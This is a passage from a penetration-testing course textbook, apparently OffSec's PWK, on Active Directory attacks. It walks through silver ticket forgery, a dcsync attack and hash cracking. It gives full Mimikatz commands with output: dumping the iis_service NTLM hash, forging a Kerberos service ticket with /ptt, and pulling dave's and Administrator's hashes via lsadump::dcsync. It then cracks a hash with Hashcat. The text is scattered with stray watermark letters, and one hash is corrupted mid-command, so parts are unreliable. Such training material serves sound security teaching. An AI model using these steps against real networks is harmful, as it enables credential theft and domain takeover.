401 - Unauthorized: Access is denied due to invalid credentials.
Server Error
401 - Unauthorized: Access is denied due to invalid credentials.
You do not have permission to view this directory or page using the credentials that
you supplied.
At line:1 char:1
+ iwr -UseBasicParsing -UseDefaultCredentials http://web04
1120 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/166d8064-c863-
41e1-9c23-edaaa5f36962
1121 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-apds/1d1f2b0c-8e8a-
4d2a-8665-508d04976f84
1122 (Active Directory Security, 2015), https://adsecurity.org/?p=2011
1123 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-
webrequest?view=powershell-7.2
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 769
Made in Morocco
Penetration Testing with Kali Linux
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : InvalidOperation:
(System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebExc
eption
+ FullyQualifiedErrorId :
WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
Listing 815 - Trying to access the web page on WEB04 as user jeff
Listing 815 shows that we cannot access the web page as jeff. Let’s start collecting the
information needed to forge a silver ticket.
Since we are a local Administrator on this machine where iis_service has an established session,
we can use Mimikatz to retrieve the SPN password hash (NTLM hash of iis_service), which is the
first piece of information we need to create a silver ticket.
Let’s start PowerShell as Administrator and launch Mimikatz. As wey already learned, we can use
privilege::debug and sekurlsa::logonpasswords to extract cached AD credentials.
k
mimikatz # privilege::debug
Privilege '20' OK
s
mimikatz # sekurlsa::logonpasswords
o
Authentication Id : 0 ; 1147751 (00000000:00118367)
Session : Service from 0
User Name : iis_service
n
Domain : CORP
Logon Server : DC1
Logon Time : 9/14/2022 4:52:14 AM
i
SID : S-1-5-21-1987370270-658905905-1781884369-1109
z
msv :
[00000003] Primary
* Username : iis_service
D
* Domain : CORP
* NTLM : 4d28cf5252d39971419580a51484ca09
* SHA1 : ad321732afe417ebbd24d5c098f986c07872f312
* DPAPI : 1210259a27882fac52cf7c679ecf4443
...
Listing 816 - Using Mimikatz to obtain the NTLM hash of the user account iis_service which is mapped to the target SPN
Listing 816 shows the password hashes of the iis_service user account. The NTLM hash of the
service account is the first piece of information we need to create the silver ticket.
Now, let’s obtain the domain SID, the second piece of information we need. We can enter whoami
/user to get the SID of the current user. Alternatively, we could also retrieve the SID of the SPN
user account from the output of Mimikatz, since the domain user accounts exist in the same
domain.
As covered in the Windows Privilege Escalation Module, the SID consists of several parts. Since
we’re only interested in the Domain SID, we’ll omit the RID of the user.
PS C:\Users\jeff> whoami /user
USER INFORMATION
----------------
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 770
Made in Morocco
Penetration Testing with Kali Linux
User Name SID
========= =============================================
corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105
Listing 817 - Obtaining the domain SID
The highlighted section in listing 817 shows the domain SID.
The last list item is the target SPN. For this example, we’ll target the HTTP SPN resource on
WEB04 (HTTP/web04.corp.com:80) because we want to access the web page running on IIS.
Now that we have collected all three pieces of information, we can build the command to create a
silver ticket with Mimikatz. We can create the forged service ticket with the kerberos::golden
module. This module provides the capabilities for creating golden and silver tickets alike. We’ll
explore the concept of golden tickets in the Module Lateral Movement in Active Directory.
We need to provide the domain SID (/sid:), domain name (/domainy:), and the target where the
SPN runs (/target:). We also need to include the SPN protocol (/service:), NTLM hash of the SPN
(/rc4:), and the /ptt option, which allows us to inject the forged ticket into the memory of the
k
machine we execute the command on.
Finally, we must enter an existing domain user for /users:. This user will be set in the forged ticket.
For this example, we’ll use jeffadmin. However, we could also use any other domain user since we
can set the permissions and groups ourselves. o
The complete command can be found in the following listing:
n
mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369
/domain:corp.com /ptt /target:web04.corp.com /service:http
/rc4:4d28cf5252d39971419580a5148i4ca09 /user:jeffadmin
User : jeffadmin z
Domain : corp.com (CORP)
SID : S-1-5-21-1987370270-658905905-1781884369
User Id : 500 D
Groups Id : *513 512 520 518 519
ServiceKey: 4d28cf5252d39971419580a51484ca09 - rc4_hmac_nt
Service : http
Target : web04.corp.com
Lifetime : 9/14/2022 4:37:32 AM ; 9/11/2032 4:37:32 AM ; 9/11/2032 4:37:32 AM
-> Ticket : ** Pass The Ticket **
* PAC generated
* PAC signed
* EncTicketPart generated
* EncTicketPart encrypted
* KrbCred generated
Golden ticket for 'jeffadmin @ corp.com' successfully submitted for current session
mimikatz # exit
Bye!
Listing 818 - Forging the service ticket with the user jeffadmin and injecting it into the current session
As shown in Listing 818, a new service ticket for the SPN HTTP/web04.corp.com has been loaded
into memory and Mimikatz set appropriate group membership permissions in the forged ticket.
From the perspective of the IIS application, the current user will be both the built-in local
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 771
Made in Morocco
Penetration Testing with Kali Linux
administrator ( Relative Id: 500 ) and a member of several highly-privileged groups, including the
Domain Admins group ( Relative Id: 512 ) as highlighted above.
This means we should have the ticket ready to use in memory. We can confirm this with klist.
PS C:\Tools> klist
Current LogonId is 0:0xa04cc
Cached Tickets: (1)
#0> Client: jeffadmin @ corp.com
Server: http/web04.corp.com @ corp.com
KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
Start Time: 9/14/2022 4:37:32 (local) y
End Time: 9/11/2032 4:37:32 (local)
Renew Time: 9/11/2032 4:37:32 (local)
k
Session Key Type: RSADSI RC4-HMAC(NT)
Cache Flags: 0
Kdc Called:
s
Listing 819 - Listing Kerberos tickets to confirm the silver ticket is submitted to the current session
Listing 819 shows that we have the silver ticketo for jeffadmin to access http/web04.corp.com
submitted to our current session. This should allow us to access the web page on WEB04 as
jeffadmin.
n
Let’s verify our access using the same command as before.
i
PS C:\Tools> iwr -UseDefaultCredentials http://web04
z
StatusCode : 200
StatusDescription : OK
D
Content : 
;
tagName=A;
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 772
Made in Morocco
Penetration Testing with Kali Linux
href=http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409}}
ParsedHtml :
RawContentLength : 703
Listing 820 - Accessing the SMB share with the silver ticket
Great! We successfully forged a service ticket and got access to the web page as jeffadmin. It’s
worth noting that we performed this attack without access to the plaintext password or password
hash of this user.
Once we have access to the password hash of the SPN, a machine account, or user, we can forge
the related service tickets for any users and permissions. This is a great way of accessing SPNs
in later phases of a penetration test, as we need privileged access in most situations to retrieve
the password hash of the SPN.
Since silver and golden tickets represent powerful attack techniquesy, Microsoft created a security
patch to update the PAC structure.1124 With this patch in place, the extended PAC structure field
PAC_REQUESTOR needs to be validated by a domain controlkler. This mitigates the capability to
forge tickets for non-existent domain users if the client and the KDC are in the same domain.
Without this patch, we could create silver tickets for domain users that do not exist. The updates
s
from this patch are enforced from October 11, 2022.
In this section, we learned how to forge service toickets by using the password hash of a target
SPN. While we used an SPN run by a user account in the example, we could do the same for
SPNs run in the context of a machine account.
n
22.2.5 Domain Controller Synchronization
i
In production environments, domains typically rely on more than one domain controller to provide
z
redundancy. The Directory Replication Service (DRS) Remote Protocol1125 uses replication1126 to
synchronize these redundant domain controllers. A domain controller may request an update for
a specific object, like an accD ount, using the IDL_DRSGetNCChanges1127 API.
Luckily for us, the domain controller receiving a request for an update does not check whether the
request came from a known domain controller. Instead, it only verifies that the associated SID
has appropriate privileges. If we attempt to issue a rogue update request to a domain controller
from a user with certain rights it will succeed.
To launch such a replication, a user needs to have the Replicating Directory Changes, Replicating
Directory Changes All, and Replicating Directory Changes in Filtered Set rights. By default,
members of the Domain Admins, Enterprise Admins, and Administrators groups have these rights
assigned.
1124 (Microsoft Support, 2023), https://support.microsoft.com/en-gb/topic/kb5008380-authentication-updates-cve-2021-42287-
9dafac11-e0d0-4cb8-959a-143bd0201041
1125 (Microsoft, 2017), https://msdn.microsoft.com/en-us/library/cc228086.aspx
1126 (Microsoft, 2016), https://technet.microsoft.com/en-us/library/cc772726(v=ws.10).aspx
1127 (Microsoft, 2019), https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/b63730ac-614c-431c-9501-
28d6aca91894
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 773
Made in Morocco
Penetration Testing with Kali Linux
If we obtain access to a user account in one of these groups or with these rights assigned, we
can perform a dcsync1128 attack in which we impersonate a domain controller. This allows us to
request any user credentials from the domain.
To perform this attack, we’ll use Mimikatz on a domain-joined Windows machine, and impacket-
secretsdump1129 on our non-domain joined Kali machine for the examples of this section.
Let’s begin with Mimikatz and start by connecting to CLIENT75 as jeffadmin with the password
BrouhahaTungPerorateBroom2023!. As jeffadmin is a member of the Domain Admins group, we
already have the necessary rights assigned.
Once connected via RDP, let’s open a PowerShell window and launch Mimikatz in C:\Tools. For
Mimikatz to perform this attack, we can use the lsadump::dcsync module and provide the domain
username for which we want to obtain credentials as an argument for /user:. For the purposes of
this example, we’ll target the domain user dave.
y
PS C:\Users\jeffadmin> cd C:\Tools\
k
PS C:\Tools> .\mimikatz.exe
...
s
mimikatz # lsadump::dcsync /user:corp\dave
[DC] 'corp.com' will be the domain o
[DC] 'DC1.corp.com' will be the DC server
[DC] 'corp\dave' will be the user account
[rpc] Service : ldap n
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
Object RDN : dave i
z
** SAM ACCOUNT **
D
SAM Username : dave
Account Type : 30000000 ( USER_OBJECT )
User Account Control : 00410200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD
DONT_REQUIRE_PREAUTH )
Account expiration :
Password last change : 9/7/2022 9:54:57 AM
Object Security ID : S-1-5-21-1987370270-658905905-1781884369-1103
Object Relative ID : 1103
Credentials:
Hash NTLM: 08d7a47a6f9f66b97b1bae4178747494
ntlm- 0: 08d7a47a6f9f66b97b1bae4178747494
ntlm- 1: a11e808659d5ec5b6c4f43c1e5a0972d
lm - 0: 45bc7d437911303a42e764eaf8fda43e
lm - 1: fdd7d20efbcaf626bd2ccedd49d9512d
...
Listing 821 - Using Mimikatz to perform a dcsync attack to obtain the credentials of pete
1128 (Active Directory Security, 2016), https://adsecurity.org/?p=2398#MimikatzDCSync
1129 (Github, 2022), https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 774
Made in Morocco
Penetration Testing with Kali Linux
Nice! Mimikatz performed the dcsync attack by impersonating a domain controller and obtained
the user credentials of dave by using replication.
Now, let’s copy the NTLM hash and store it in a file named hashes.dcsync on our Kali system. We
can then crack the hash using Hashcat as we learned in the Password Attacks Module. We’ll enter
1000 as mode, rockyou.txt as wordlist, and best64.rule as rule file. Additionally, we will enter the
file containing the NTLM hash and --force, since we run Hashcat in a VM.
kali@kali:~$ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r
/usr/share/hashcat/rules/best64.rule --force
...
08d7a47a6f9f66b97b1bae4178747494:Flowers1
...
Listing 822 - Using Hashcat to crack the NTLM hash obtained by the dcsync attack
Listing 822 shows that we successfully retrieved the plaintext passwyord of dave.
We can now obtain the NTLM hash of any domain user account of the domain corp.com.
k
Furthermore, we can attempt to crack these hashes and retrieve the plaintext passwords of these
accounts.
s
Notably, we can perform the dcsync attack to obtain any user password hash in the domain, even
the domain administrator Administrator.
o
mimikatz # lsadump::dcsync /user:corp\Administrator
... n
Credentials:
Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
... i
Listing 823 - Using Mimikatz to perfzorm a dcsync attack to obtain the credentials of the domain administrator
Administrator
We’ll discuss lateral movemDent vectors such as leveraging NTLM hashes obtained by dcsync in